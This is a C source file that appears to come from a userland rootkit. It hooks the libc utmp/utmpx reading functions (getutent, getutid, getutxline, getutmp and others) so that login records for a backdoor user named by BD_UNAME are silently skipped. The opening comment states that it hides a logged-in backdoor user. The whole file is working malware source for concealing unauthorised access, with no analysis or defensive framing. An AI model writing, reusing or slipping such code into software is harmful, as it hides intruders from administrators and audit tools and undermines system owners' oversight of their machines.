/*
 * These are the functions responsible for reading
 * entries from the utmp file.
 *
 * The utmp file may contain information about the
 * currently logged in backdoor user, but ain't
 * nobody seeing it up front.
 *
 * See 'putut.c' for more information.
 */

struct utmp *getutid(const struct utmp *ut){
    struct utmp *tmp;

    hook(CGETUTID);

    do{
        tmp = call(CGETUTID, ut);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

struct utmpx *getutxid(const struct utmpx *utx){
    struct utmpx *tmp;

    hook(CGETUTXID);

    do{
        tmp = call(CGETUTXID, utx);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

struct utmp *getutline(const struct utmp *ut){
    struct utmp *tmp;

    hook(CGETUTLINE);

    do{
        tmp = call(CGETUTLINE, ut);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

struct utmpx *getutxline(const struct utmpx *utx){
    struct utmpx *tmp;

    hook(CGETUTXLINE);

    do {
        tmp = call(CGETUTXLINE, utx);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

struct utmp *getutent(void){
    struct utmp *tmp;

    hook(CGETUTENT);

    do{
        tmp = call(CGETUTENT);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

struct utmpx *getutxent(void){
    struct utmpx *tmp;

    hook(CGETUTXENT);
    
    do{
        tmp = call(CGETUTXENT);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(BD_UNAME, tmp->ut_user, strlen(BD_UNAME)));

    return tmp;
}

void getutmp(const struct utmpx *ux, struct utmp *u){
    if(hide_me) return;

    if(ux && ux->ut_user != NULL){
        if(!strncmp(BD_UNAME, ux->ut_user, strlen(BD_UNAME)))
            hide_me = 1;
    }

    if(hide_me) return;
    hook(CGETUTMP);
    call(CGETUTMP, ux, u);
    return;
}

void getutmpx(const struct utmp *u, struct utmpx *ux){
    if(hide_me) return;

    if(u && u->ut_user != NULL){
        if(!strncmp(BD_UNAME, u->ut_user, strlen(BD_UNAME)))
            hide_me = 1;
    }

    if(hide_me) return;
    hook(CGETUTMPX);
    call(CGETUTMPX, u, ux);
}
